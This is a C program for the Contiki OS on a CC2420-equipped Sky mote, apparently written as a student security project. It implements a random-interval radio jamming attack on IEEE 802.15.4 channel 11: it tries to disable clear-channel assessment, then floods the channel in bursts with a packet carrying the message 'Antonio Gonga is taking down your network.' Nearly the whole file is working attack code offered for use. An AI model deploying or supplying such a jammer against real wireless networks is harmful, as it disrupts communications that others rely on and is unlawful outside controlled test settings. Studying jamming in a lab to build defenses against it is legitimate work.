
/**
 * \file
 *         Program for jamming a specific channel
 * \author
 *         Malthe Tøttrup <201907882@post.au.dk>
 * 
 *         $ make TARGET=sky distclean 
 *         $ make TARGET=sky MOTES=/dev/ttyUSB0 jammer_random.upload login
 */

#include "contiki.h"
#include <stdio.h> /* For printf() */
#include <math.h>
#include <os/dev/radio.h>  
#include "net/nullnet/nullnet.h"
#include "net/netstack.h"
#include <string.h>
#include "sys/log.h"
#include "cc2420.h"
#include <stdlib.h>
#include "dev/watchdog.h"

#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO
#define CLOCK_MS CLOCK_SECOND/1000
#define SEND_INTERVAL (2 * CLOCK_MS) //2 ms
#define JAMMER_PACKET_LEN 120

typedef struct{
     char data[JAMMER_PACKET_LEN];
}jpacket_t;

/*---------------------------------------------------------------------------*/
PROCESS(jammer, "jammer process");
AUTOSTART_PROCESSES(&jammer);
/*---------------------------------------------------------------------------*/

int abs(a){
    if(a < 0){
        return -1*a;
    }
    else {
        return a;
    }
}

PROCESS_THREAD(jammer, ev, data)
{   
    PROCESS_BEGIN();
    printf("Starting jamming attack\n");

    static int channel = 11;
    NETSTACK_RADIO.on();
    //NETSTACK_RADIO.set_value(RADIO_PARAM_CCA_THRESHOLD, 0); //turning CCA off (https://sourceforge.net/p/contiki/mailman/message/34745886/)
    
    //Hopefully this turns CCA off...
    NETSTACK_RADIO.set_value(RADIO_PARAM_TX_MODE, 0);

    //Connect to the desired channel
    if(NETSTACK_RADIO.set_value(RADIO_PARAM_CHANNEL, channel) != RADIO_RESULT_OK) 
    {
        printf("failed channel set");
    }
    cc2420_set_channel(channel);
    
    jpacket_t jpacket;
    memset(&jpacket, 0, sizeof(jpacket_t));
    
    strcpy(jpacket.data, "Antonio Gonga is taking down your network.");
    

    static int random_interval = 0;
    static int wait_time = 0;
    static int send_time = 0;
    
    static struct etimer et;
    etimer_set(&et, CLOCK_SECOND);
    srand(128);
    
    printf("VALUE = %ld\n", CLOCK_SECOND);

    //send a packet at random times between 0-2 seconds
    while(1) {
        PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
        // cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN);
        
        send_time = abs(rand() % (int)CLOCK_SECOND*4);
        wait_time = abs(rand() % (int)CLOCK_SECOND*3);
        if(wait_time == 0)
            wait_time = 1;
                
        watchdog_stop();
        while(random_interval <= send_time){
            cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN);
            //NETSTACK_RADIO.send((void*)&jpacket, JAMMER_PACKET_LEN);
            random_interval++;
        }
        watchdog_start();
        random_interval = 0;

    
        //printf("wait_time: %d\n", wait_time);
        etimer_set(&et, wait_time);
        etimer_reset(&et);
    }

    PROCESS_END();
}
/*---------------------------------------------------------------------------*/